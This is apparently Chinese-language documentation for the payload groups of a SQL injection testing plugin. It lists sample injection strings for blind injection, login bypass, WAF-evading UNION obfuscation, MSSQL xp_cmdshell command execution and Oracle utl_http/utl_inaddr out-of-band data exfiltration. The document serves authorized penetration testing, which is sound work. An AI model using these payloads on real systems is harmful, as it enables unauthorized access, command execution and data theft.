# Payload 组说明文档

## 概述

DouSql 插件内置了 7 个专业的 payload 组，涵盖各种 SQL 注入测试场景。每个组都针对特定的攻击场景进行了优化。

## 内置 Payload 组

### 1. default（21个payload）
**用途**：通用 SQL 注入检测，适合快速扫描

**包含的攻击类型**：
- 基础注入测试（单引号、双引号）
- 时间盲注（SLEEP、延时检测）
- 布尔盲注（逻辑判断）
- 报错注入（错误信息泄露）

**适用场景**：
- 初步扫描未知目标
- 快速检测常见注入点
- 日常渗透测试

**示例 payload**：
```
'
''
+AND 1=1
+AND sleep(5)
+AND (SELECT 8778 FROM (SELECT(SLEEP(5)))nXpZ)'
```

---

### 2. order测试组（3个payload）
**用途**：专门用于 ORDER BY 子句的注入测试

**包含的攻击类型**：
- ORDER BY 数字注入
- ORDER BY 延时注入

**适用场景**：
- 排序功能测试
- 列数探测
- ORDER BY 子句注入

**示例 payload**：
```
,1
,0
,(select sleep(5))
```

---

### 3. blind-injection-fuzz（42个payload）
**用途**：盲注专用字典，深度时间盲注测试

**包含的攻击类型**：
- MySQL sleep() 注入
- MSSQL waitfor delay 注入
- PostgreSQL pg_sleep() 注入
- MySQL benchmark() 注入

**适用场景**：
- 无回显注入场景
- 时间盲注深度测试
- 多数据库环境测试

**示例 payload**：
```
sleep(5)#
1 or sleep(5)#
' or sleep(5)='
;waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
pg_sleep(5)--
```

---

### 4. login-password-injection-fuzz（73个payload）
**用途**：登录绕过专用字典

**包含的攻击类型**：
- 万能密码
- 认证绕过
- 逻辑漏洞利用
- 注释符绕过

**适用场景**：
- 登录表单测试
- 认证机制绕过
- 后台登录测试

**示例 payload**：
```
' or '1'='1
admin' or '1'='1'--
admin' or 1=1#
" or "a"="a
'OR 1=1%00
```

---

### 5. mssql-payloads-fuzz（14个payload）
**用途**：MSSQL 数据库专用 payload

**包含的攻击类型**：
- xp_cmdshell 命令执行
- waitfor delay 时间盲注
- UNION 查询
- 版本信息获取
- 权限检测

**适用场景**：
- 确认目标为 MSSQL 数据库
- MSSQL 特性利用
- 高权限注入利用

**示例 payload**：
```
'; exec master..xp_cmdshell 'ping 10.10.1.2'--
' or 1=1 --
' union (select @@version) --
'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --
```

---

### 6. oracle-payloads-fuzz（8个payload）
**用途**：Oracle 数据库专用 payload

**包含的攻击类型**：
- utl_http 外带数据
- utl_inaddr DNS 外带
- 数据库信息获取
- 用户权限探测

**适用场景**：
- 确认目标为 Oracle 数据库
- Oracle 特性利用
- 数据外带测试

**示例 payload**：
```
' or '1'='1
'||utl_http.request('httP://192.168.1.1/')||'
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
```

---

### 7. union-select-bypass（30个payload）
**用途**：UNION 注入 WAF 绕过字典

**包含的攻击类型**：
- 大小写混淆
- 注释符绕过
- 编码绕过
- 空白符绕过
- 内联注释绕过

**适用场景**：
- WAF/IDS 绕过
- UNION 注入测试
- 防护机制测试

**示例 payload**：
```
/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+union+distinct+select+
/**//*!12345UNION SELECT*//**/
uni%0bon+se%0blect
REVERSE(noinu)+REVERSE(tceles)
```

---

## 使用建议

### 测试流程推荐

1. **初步扫描**：使用 `default` 组进行快速检测
2. **深度测试**：根据初步结果选择专用组
   - 发现盲注 → 使用 `blind-injection-fuzz`
   - 登录场景 → 使用 `login-password-injection-fuzz`
   - 遇到 WAF → 使用 `union-select-bypass`
3. **数据库特定测试**：确认数据库类型后使用对应组
   - MSSQL → `mssql-payloads-fuzz`
   - Oracle → `oracle-payloads-fuzz`

### 组合使用策略

- **快速扫描**：default → 发现可疑点 → 专用组深度测试
- **登录测试**：login-password-injection-fuzz → blind-injection-fuzz
- **WAF 环境**：union-select-bypass → blind-injection-fuzz
- **已知数据库**：直接使用对应数据库专用组

### 自定义 Payload 组

如果内置组不满足需求，可以：
1. 在插件界面创建新组
2. 添加针对目标的专用 payload
3. 保存后即可在右键菜单中使用

---

## 配置文件位置

所有 payload 组的配置文件保存在：
```
~/dousql/xia_SQL_payload_[组名].ini
```

例如：
- `~/dousql/xia_SQL_diy_payload_default.ini`
- `~/dousql/xia_SQL_payload_blind-injection-fuzz.ini`
- `~/dousql/xia_SQL_payload_union-select-bypass.ini`

---

## 注意事项

1. **测试前确认授权**：仅在授权范围内使用
2. **注意请求频率**：大量 payload 可能触发 WAF/IDS
3. **合理设置延时**：避免对目标服务器造成压力
4. **关注响应时间**：时间盲注需要稳定的网络环境
5. **保存测试结果**：及时记录发现的漏洞

---

## 更新日志

- **v3.0.6**：新增 6 个专业 payload 组，总计 300+ payload
- 更新 default 组内容，优化通用检测效果
- 所有组支持从配置文件加载和保存
